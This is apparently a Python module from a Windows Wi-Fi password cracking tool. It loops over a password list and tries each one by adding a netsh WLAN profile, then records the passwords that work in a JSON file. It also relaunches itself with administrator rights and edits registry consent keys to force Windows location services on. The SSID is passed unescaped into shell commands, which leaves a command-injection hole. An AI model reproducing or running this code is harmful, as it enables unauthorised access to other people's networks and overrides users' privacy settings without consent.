import json
import os
import time
import tempfile
import html
import sys
import ctypes
import winreg
import subprocess

from pywifi import const


class Connect:
    def __build_windows_xml(self, ssid: str, password: str | None, auth_mode: str) -> str:

        ssid_hex = ssid.encode("utf-8").hex().upper()
        safe_ssid = html.escape(ssid)
        safe_pass = html.escape(password) if password else ""

        if auth_mode == "OPEN" or not password:
            security_block = """
            <authEncryption>
                <authentication>open</authentication>
                <encryption>none</encryption>
                <useOneX>false</useOneX>
            </authEncryption>"""
        elif auth_mode == "WPA3":
            security_block = f"""
            <authEncryption>
                <authentication>WPA3SAE</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
                <transitionMode xmlns="http://www.microsoft.com/networking/WLAN/profile/v4">true</transitionMode>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{safe_pass}</keyMaterial>
            </sharedKey>"""
        else:
            security_block = f"""
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{safe_pass}</keyMaterial>
            </sharedKey>"""

        return f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{safe_ssid}</name>
    <SSIDConfig>
        <SSID>
            <hex>{ssid_hex}</hex>
            <name>{safe_ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <MSM>
        <security>{security_block}
        </security>
    </MSM>
</WLANProfile>"""

    def __try_profile(self, iface, ssid: str, xml_data: str, wait_seconds: float = 2.0) -> int:
        iface.disconnect()
        time.sleep(0.1)
        subprocess.run(f'netsh wlan delete profile name="{ssid}"', shell=True, capture_output=True)
        with tempfile.NamedTemporaryFile("w", suffix=".xml", delete=False, encoding="utf-8") as tmp:
            tmp.write(xml_data)
            tmp_path = tmp.name

        try:
            add_res = subprocess.run(
                f'netsh wlan add profile filename="{tmp_path}"',
                shell=True,
                capture_output=True
            )
            if add_res.returncode != 0:
                return 403

            subprocess.run(
                f'netsh wlan connect name="{ssid}" ssid="{ssid}"',
                shell=True,
                capture_output=True
            )
        finally:
            if os.path.exists(tmp_path):
                os.remove(tmp_path)

        steps = int(wait_seconds / 0.15)
        for _ in range(steps):
            time.sleep(0.15)
            if iface.status() == const.IFACE_CONNECTED:
                return 200

        subprocess.run(f'netsh wlan delete profile name="{ssid}"', shell=True, capture_output=True)
        return 403

    def _connect_to_wifi(self, iface, ssid: str, password: str, auth_type: str = "?") -> int:

        if password and len(password) < 8:
            return 403

        auth_upper = auth_type.upper()

        if "WPA3" in auth_upper:
            xml = self.__build_windows_xml(ssid, password, "WPA3")
            return self.__try_profile(iface, ssid, xml, wait_seconds=3.0)

        elif "WPA2" in auth_upper or "WPA" in auth_upper:
            xml = self.__build_windows_xml(ssid, password, "WPA2")
            return self.__try_profile(iface, ssid, xml, wait_seconds=2.0)

        else:
            xml_wpa3 = self.__build_windows_xml(ssid, password, "WPA3")
            if self.__try_profile(iface, ssid, xml_wpa3, wait_seconds=3.0) == 200:
                return 200

            xml_wpa2 = self.__build_windows_xml(ssid, password, "WPA2")
            return self.__try_profile(iface, ssid, xml_wpa2, wait_seconds=2.5)

    def _reader_pass(self) -> tuple[str, ...]:
        if not os.path.exists("passwords.txt"):
            return ()
        with open("passwords.txt", "r", encoding="utf-8") as f:
            return tuple(line.strip() for line in f if line.strip())

    def _json_reader(self) -> dict:
        filename = "success_password.json"
        if not os.path.exists(filename):
            return {}
        try:
            with open(filename, "r", encoding="utf-8") as f:
                content = f.read().strip()
                return json.loads(content) if content else {}
        except json.JSONDecodeError:
            return {}

    def _json_writer(self, data: dict):
        existing_data = self._json_reader()
        existing_data.update(data)
        with open("success_password.json", "w", encoding="utf-8") as f:
            json.dump(existing_data, f, ensure_ascii=False, indent=4)

    def __ensure_admin(self):
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            is_admin = False

        if not is_admin:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(f'"{arg}"' for arg in sys.argv), None, 1
            )
            sys.exit(0)

    def enable_windows_location(self) -> bool:
        self.__ensure_admin()

        reg_paths = [
            (winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location"),
            (winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location\NonPackaged"),
            (winreg.HKEY_CURRENT_USER,
             r"Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location"),
        ]

        try:
            for root_key, path in reg_paths:
                with winreg.CreateKeyEx(root_key, path, 0, winreg.KEY_SET_VALUE) as key:
                    winreg.SetValueEx(key, "Value", 0, winreg.REG_SZ, "Allow")

            subprocess.run("sc config lfsvc start= demand", shell=True, capture_output=True)
            subprocess.run("net start lfsvc", shell=True, capture_output=True)

            return True

        except PermissionError:
            print("[-] Error: Insufficient permissions to modify the registry (must be run as an administrator).")
            return False
        except Exception as e:
            print(f"[-] Error when enabling geolocation: {e}")
            return False